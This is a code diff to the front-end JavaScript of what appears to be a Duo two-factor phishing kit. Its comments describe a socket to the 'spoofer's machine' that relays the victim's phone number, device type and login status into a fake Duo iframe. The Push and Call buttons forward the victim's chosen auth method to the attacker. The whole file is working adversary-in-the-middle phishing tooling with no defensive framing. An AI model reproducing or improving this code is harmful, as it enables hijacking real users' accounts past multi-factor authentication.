@@ -6,6 +6,10 @@ function loaded() {
     window.mobile = document.getElementById("mobile").innerHTML.includes("true")? true : false;
     console.log("Session is:", window.sid);
 
+    // Get reference to duo iframe
+    var frame = document.getElementById("duo_iframe");
+    var frameDoc = frame.contentWindow.document;
+
     // Opens a new socket that connects to spoofer's machine.
     // This socket keeps itself alive by receiving pong's for every
     // ping it sends out. After sending a ping, the server has 
@@ -71,13 +75,23 @@ function loaded() {
                 console.log(event);
 
                 // If number is defined, update number by setting DUO iframe
-                if (data.number != undefined)
+                if (data.number != undefined) {
                     frameDoc.getElementById("phone-number")
                         .innerHTML = "Dialing " + data.number + "...";
                     if (window.authMethod == 1)
                         showMsg('msg-call-1');
                     else 
                         window.phoneNum = data.number;
+                }
+
+                if (data.device != undefined) {
+                    try {
+                        if (data.device == "ios")
+                            frameDoc.getElementsByClassName("push-label")[0].style = "display: none";
+                        if (data.device == "android")
+                            frameDoc.getElementsByClassName("push-label")[0].style = "display: block";
+                    } catch(e){};
+                }
 
                 // Received logged in packet. Call login callback
                 if (data.status == "loggedIn") {
@@ -99,9 +113,6 @@ function loaded() {
     initSock();
 
     // Play startup loading animations. Different loading for mobile / web
-    var frame = document.getElementById("duo_iframe");
-    var frameDoc = frame.contentWindow.document;
-
     frame.contentWindow.loadAnim();
     if (window.mobile) { 
         setTimeout(()=>{
@@ -132,6 +143,7 @@ function loaded() {
 
     // Set on-click handler for DUO Push notification button
     frameDoc.getElementById("pushme").onclick = function() {
+        console.log("Selecting authmethod 0");
         sendAuthMethod(0)       
         window.authMethod = 0;
         setTimeout(function() {
@@ -141,6 +153,7 @@ function loaded() {
  
     // Set on-click handler for DUO Phone call button
     frameDoc.getElementById("callme").onclick = function() {
+        console.log("Selecting authmethod 1");
         sendAuthMethod(1)       
         if (window.phoneNum == undefined) {
             window.authMethod = 1;
